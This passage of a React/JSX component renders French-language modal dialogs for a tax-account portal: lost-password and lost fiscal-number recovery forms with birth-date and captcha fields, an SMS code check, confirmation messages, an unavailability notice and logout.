                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre année de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostPassword_anneeNaissance_tmp"
                        id="LostPassword_anneeNaissance_tmp"
                        aria-required="true"
                        aria-label="Année de naissance"
                        autoComplete="bday-year"
                        placeholder="AAAA"
                        data-mask="int"
                        data-max={4}
                        maxLength={4}
                      />
                    </div>
                    <div className="col-xs-11 col-md-12">
                      <div
                        role="alert"
                        className="erreur hide alert alert-danger cat1"
                        id="Cat1_LostPassword_DateNaissance"
                      />
                    </div>
                  </div>
                  {/* row FIN */}
                  {/*====================*/}
                  {/*      Captcha       */}
                  {/*====================*/}
                  <div className="row">
                    <div className="col-md-12">
                      <div
                        className="form-group"
                        id="fg_LostPassword_captchaText"
                      >
                        <label
                          htmlFor="LostPassword_captchaText_tmp"
                          className="obligatoire"
                        >
                          Recopiez les caractères de l&apos;image ou de
                          l&apos;extrait sonore
                        </label>
                        <div
                          className="ephemere hidden"
                          id="liveCheck_captchaTextFisc_tmp"
                        />
                        <input
                          className="form-control"
                          type="text"
                          name="LostPassword_captchaText_tmp"
                          aria-required="true"
                          autoComplete="off"
                          id="LostPassword_captchaText_tmp"
                          data-max={25}
                          data-mask="alphanum"
                        />
                        <div
                          role="alert"
                          className="erreur hide alert alert-danger cat1"
                          id="Cat1_captchaTextFisc"
                        />
                      </div>
                      {/* form-group FIN */}
                    </div>
                    {/* col-md-12 FIN */}
                  </div>
                  {/* row FIN */}
                  <div className="form-group">
                    <div className="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
                      <div
                        className=" col-xs-12 col-sm-6 col-md-6 com-lg-6"
                        id="divCaptchapassPerdu"
                      ></div>
                      <div className="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
                        <a href="#" className="listen">
                          Écouter l&apos;extrait sonore
                        </a>
                        <audio className="audio">
                          Votre navigateur ne prend pas en charge l&apos;élément
                          audio.
                        </audio>
                        <br />
                        <a href="#" className="renewImage">
                          Changer d&apos;image
                        </a>
                      </div>
                      {/* col-12 */}
                      <div className="clear" />
                    </div>
                    {/* captcha */}
                  </div>
                  {/* form-group */}
                  <div className="row">
                    <div className="col-xs-12 text-center">
                      <br />
                      <button
                        type="submit"
                        className="btn btn-primary"
                        id="lostpass"
                        name="lostpass"
                        value="get pass"
                      >
                        Continuer
                      </button>
                    </div>
                    {/* col */}
                  </div>
                  {/* row */}
                </div>
                {/* pass */}
              </form>
              {/* form */}
            </div>
            {/* modal body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/*Fenetre modale dans le cas de perte de mot de passe*/}
      {/*============================================================*/}
      {/*FIN Fenetre modale dans le cas de perte de mot de passe */}
      {/*============================================================*/}
      {/*============================================================*/}
      {/*DEBUT Fenetre modale dans le cas de perte de num. fiscal */}
      {/*============================================================*/}
      <div
        id="numFiscal"
        className="modal fade"
        role="dialog"
        tabIndex={-1}
        aria-labelledby="numFiscalTitle"
      >
        <div className="modal-dialog" role="document">
          <div className="modal-content">
            <div className="modal-header">
              <button
                type="button"
                className="close"
                data-dismiss="modal"
                aria-label="Fermer"
              >
                <span aria-hidden="true">×</span>
              </button>
              <h3 id="numFiscalTitle" className="modal-title titre">
                TITRE
              </h3>
            </div>
            <div className="modal-body">
              <form
                method="post"
                action="/monprofil-webapp/noAuth/LostSpi"
                id="oubliNumFiscalForm"
                name="oubliNumFiscalForm"
                target="hidden-oubliNumFiscalForm"
              >
                <input type="hidden" id="LostSpi_email" name="email" />
                <input
                  type="hidden"
                  id="LostSpi_captchaText"
                  name="captchaText"
                />
                <input
                  type="hidden"
                  id="LostSpi_dateNaissance"
                  name="dateNaissance"
                />
                <input
                  type="hidden"
                  id="LostSpi_dateNaissance_tmp"
                  name="dateNaissance_tmp"
                  disabled="true"
                />
                <iframe
                  style={{ display: "none" }}
                  name="hidden-oubliNumFiscalForm"
                  id="hidden-oubliNumFiscalForm"
                  aria-hidden="true"
                  title="Cadre technique"
                >
                  {" "}
                </iframe>
                <div id="fisc">
                  <div
                    role="alert"
                    className="alert alert-danger cat2 hide"
                    id="erreurModFisc"
                  />
                  {/* <div role="alert" class="alert alert-danger hide" id="CAT2OubliFisc"></div> */}
                  {/*=======*/}
                  {/* email */}
                  {/*=======*/}
                  <div className="form-group" id="fg_LostSpi_email">
                    <label htmlFor="LostSpi_email_tmp">
                      Adresse électronique
                    </label>
                    <div
                      className="ephemere hidden"
                      id="liveCheck_LostSpi_email_tmp"
                    />
                    <input
                      className="form-control"
                      type="email"
                      name="LostSpi_email_tmp"
                      aria-required="true"
                      autoComplete="on"
                      id="LostSpi_email_tmp"
                      placeholder="Ex : un@exemple.fr"
                      data-original-title="Il s'agit de l'adresse électronique saisie lors de la création de votre espace particulier ou de celle indiquée, postérieurement, dans le service &quot;Mon profil&quot;."
                      data-toggle="tooltip"
                      data-placement="top"
                      maxLength={121}
                      data-max={121}
                    />
                  </div>
                  {/* form-group */}
                  {/* ================= */}
                  {/* date de naissance */}
                  {/* ================= */}
                  <div className="row form-row " id="fr_LostSpi_DateNaissance">
                    <div className="col-xs-11 col-md-12">
                      <label htmlFor="saisieDate">
                        Indiquez votre date de naissance
                      </label>
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostSpi_jourNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostSpi_moisNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostSpi_anneeNaissance_tmp"
                        role="alert"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <label
                        htmlFor="LostSpi_jourNaissance_tmp"
                        className="hidden"
                      >
                        Indiquez votre jour de naissance
                      </label>
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre jour de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostSpi_jourNaissance_tmp"
                        id="LostSpi_jourNaissance_tmp"
                        aria-required="true"
                        aria-label="Jour de naissance"
                        autoComplete="bday-day"
                        placeholder="JJ"
                        data-max={2}
                        data-mask="jour"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre mois de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostSpi_moisNaissance_tmp"
                        id="LostSpi_moisNaissance_tmp"
                        aria-required="true"
                        aria-label="Mois de naissance"
                        autoComplete="bday-month"
                        placeholder="MM"
                        data-max={2}
                        data-mask="mois"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre année de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostSpi_anneeNaissance_tmp"
                        id="LostSpi_anneeNaissance_tmp"
                        aria-required="true"
                        aria-label="Année de naissance"
                        autoComplete="bday-year"
                        placeholder="AAAA"
                        data-mask="int"
                        data-max={4}
                        maxLength={4}
                      />
                    </div>
                    <div className="col-xs-11 col-md-12">
                      <div
                        role="alert"
                        className="erreur hide alert alert-danger cat1"
                        id="Cat1_LostSpi_DateNaissance"
                      />
                    </div>
                  </div>
                  {/* row FIN */}
                  {/*====================*/}
                  {/*      Captcha       */}
                  {/*====================*/}
                  <div className="form-group" id="fg_LostSpi_captchaText">
                    <label
                      htmlFor="LostSpi_captchaTextPwd_tmp"
                      className="obligatoire"
                    >
                      Recopiez les caractères de l&apos;image ou de
                      l&apos;extrait sonore
                    </label>
                    <input
                      className="form-control"
                      type="text"
                      name="LostSpi_captchaText_tmp"
                      aria-required="true"
                      autoComplete="off"
                      id="LostSpi_captchaText_tmp"
                      data-max={25}
                      data-mask="alphanum"
                    />
                    <div
                      className="ephemere hidden"
                      id="liveCheck_captchaText_tmp"
                    />
                  </div>
                  {/* form-group */}
                  <div className="form-group">
                    {/* FORM-GROUP */}
                    <div className="captcha-container col-xs-12 col-sm-12 col-md-12 com-lg-12">
                      <div
                        className=" col-xs-12 col-sm-6 col-md-6 com-lg-6"
                        id="divCaptchanumFiscal"
                      ></div>
                      <div className="col-xs-12 col-sm-6 col-md-6 com-lg-6 lienCaptcha">
                        <a href="#" className="listen">
                          Écouter l&apos;extrait sonore
                        </a>
                        <br />
                        <audio className="audio">
                          Votre navigateur ne prend pas en charge l&apos;élément
                          audio.
                        </audio>
                        <a href="#" className="renewImage">
                          Changer d&apos;image
                        </a>
                      </div>
                    </div>
                    <div className="clear" />
                  </div>
                  {/* form-group */}
                  <div className="row">
                    <div className="col-xs-12 text-center">
                      <br />
                      <button
                        type="submit"
                        className="btn btn-primary"
                        id="lostspi"
                        name="lostspi"
                        value="get SPI"
                        title="Recevoir mon numéro fiscal"
                      >
                        Continuer
                      </button>
                    </div>
                    {/* col-12 FIN */}
                  </div>
                  {/* row FIN */}
                </div>
                {/* fisc FIN */}
              </form>
              {/* form */}
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/* numFiscal */}
      {/*============================================================*/}
      {/*FIN Fenetre modale dans le cas de perte de num. fiscal */}
      {/*============================================================*/}
      {/*============================================================*/}
      {/* Fenetre modale de validation SMS envoye                    */}
      {/*============================================================*/}
      <div id="checkSMSMod" className="modal fade" role="dialog">
        <div className="modal-dialog">
          <div className="modal-content">
            <div className="modal-header">
              <button
                type="button"
                className="close"
                data-dismiss="modal"
                title="Fermeture de la fenêtre"
                aria-label="Fermer"
              >
                <span aria-hidden="true">×</span>
              </button>
              <h4 className="modal-title titre">Titre</h4>
            </div>
            {/* modal-header */}
            <div className="modal-body">
              <form
                method="post"
                action="CIBLE"
                id="checkSMSForm"
                name="checkSMSForm"
                target="hidden-checkSMSForm"
              >
                <input type="hidden" id="code_SMS" name="code" />
                <iframe
                  style={{ display: "none" }}
                  name="hidden-checkSMSForm"
                  id="hidden-checkSMSForm"
                  aria-hidden="true"
                  title="Cadre technique"
                >
                  {" "}
                </iframe>
                <div
                  role="alert"
                  className="alert alert-danger cat2 hide"
                  id="erreurModSMS"
                />
                <div className="alert alert-info hide cat3" id="msgInfoSMS" />
                <div
                  className="alert alert-info hide cat3"
                  id="msgInfoSMSITX"
                />
                <div className="form-group" id="fg_code_SMS">
                  <label htmlFor="code_SMS_tmp" className="sr-only">
                    Code adressé par SMS (6 chiffres)
                  </label>
                  <input
                    className="form-control"
                    type="text"
                    inputMode="numeric"
                    name="code_SMS_tmp"
                    aria-required="true"
                    autoComplete="one-time-code"
                    pattern="^\d{6}$"
                    id="code_SMS_tmp"
                    placeholder="Format : 6 chiffres"
                    data-original-title="Code"
                    data-toggle="tooltip"
                    data-placement="top"
                    maxLength={6}
                    data-max={6}
                    data-feedbackok={1}
                    data-mask="int"
                  />
                </div>
                {/* form-group */}
                <div id="ctrl-no">
                  <div
                    className="ephemere hidden"
                    id="liveCheck_code_SMS_tmp"
                  />
                  <div style={{ float: "right" }}>
                    <p id="P_codeNonRecu">
                      <a id="codeNonRecu" href="#">
                        Je n&apos;ai pas reçu le code.
                      </a>
                    </p>
                  </div>
                </div>
                <br />
                <br />
                <div
                  role="alert"
                  className="alert alert-info cat2 hide"
                  id="infoRenewSMS"
                />
                <div
                  role="alert"
                  className="alert alert-info hide"
                  id="infoLastSMS"
                />
                <div className="row">
                  <div className="col-md-12 text-center">
                    <br />
                    <button
                      type="submit"
                      className="btn btn-primary"
                      id="buttonSMS"
                      name="lostspi"
                      value="checkSMS"
                    >
                      cRecevoir le lien de renouvellement
                    </button>
                    <br />
                    <button
                      type="submit"
                      className="btn btn-primary hide"
                      id="lostpass"
                      name="lostpass"
                      value="checkSMS"
                    >
                      Recevoir le lien de renouvellement
                    </button>
                  </div>
                </div>
              </form>
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/* confirmationSms */}
      {/* =================================== */}
      {/* Fenetre modale de confirmation mail */}
      {/* =================================== */}
      <div id="confirmationSpi" className="modal fade" role="dialog">
        <div className="modal-dialog">
          <div className="modal-content">
            <div className="modal-header">
              <button
                type="button"
                className="close"
                data-dismiss="modal"
                title="Fermeture de la fenêtre"
                aria-label="Fermer"
              >
                <span aria-hidden="true">×</span>
              </button>
              <h4 className="modal-title titre">TITRE</h4>
            </div>
            {/* modal-header */}
            <div className="modal-body">
              <div
                className="alert alert-info hide cat3"
                id="numFiscalMsgInfoNeedSecure"
              />
              <p>
                Vous allez recevoir un courriel avec le(s) numéro(s) fiscal(aux)
                correspondant à l&apos;adresse que vous avez saisie.
              </p>
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/* confirmationSpi */}
      {/* ===================================== */}
      {/* Fenetre modale de confirmation passwd */}
      {/* ===================================== */}
      <div id="confirmationPassword" className="modal fade" role="dialog">
        <div className="modal-dialog">
          <div className="modal-content">
            <div className="modal-header">
              <button
                type="button"
                className="close"
                data-dismiss="modal"
                title="Fermeture de la fenêtre"
                aria-label="Fermer"
              >
                <span aria-hidden="true">×</span>
              </button>
              <h4 className="modal-title titre">TITRE</h4>
            </div>
            {/* modal-header */}
            <div className="modal-body">
              <div
                className="alert alert-info hide cat3"
                id="passPerduMsgInfoNeedSecure"
              />
              <p>
                Vous allez recevoir un courriel à l&apos;adresse que vous avez
                indiquée dans votre espace particulier.
              </p>
              <p>
                Il vous permettra de renouveler votre mot de passe en quelques
                clics.
              </p>
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/*"confirmationPassword" */}
      {/* ======================== */}
      {/* Fenetre modale d&apos;indispo */}
      {/* ======================== */}
      <div id="indispoMP" className="modal fade lost" role="dialog">
        <div className="modal-dialog">
          <div className="modal-content">
            <div className="modal-body">
              {/* <div id="CatModIndispoMP" > */}
              <p>
                {" "}
                Le service est indisponible&nbsp;; veuillez réitérer votre
                demande ultérieurement.{" "}
              </p>
              {/* </div> */}
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/* indispoMP */}
      {/* ============================= */}
      {/* Fenetre modale de deconnexion */}
      {/* ============================= */}
      <div id="deco" className="modal fade" role="dialog">
        <div className="modal-dialog">
          <div className="modal-content" id="deco_contenu">
            <div className="modal-header">
              <h3 className="modal-title titre">Déconnexion</h3>
            </div>
            <div className="modal-body">
              <div id="deconnecte" className="rounded">
                <iframe
                  name="app0"
                  id="app0"
                  className="hide"
                  aria-hidden="true"
                  title="Cadre technique"
                />
                Déconnexion en cours, veuillez patienter...
                <br />
                <br />
                {/* <div class="text-center" id="decoWait"><img src="/images/Miniballs.gif" alt=""/></div> */}
                <div className="text-center" id="decoWait" />
                <br />
              </div>
              {/* deconnecte" */}
            </div>
            {/* modal-body */}
          </div>
          {/* modal-content */}
        </div>
        {/* modal-dialog */}
      </div>
      {/* deco */}
      {/* ================================= */}
      {/* FIN Fenetre modale de deconnexion */}
      {/* ================================= */}
    </>
  );
}
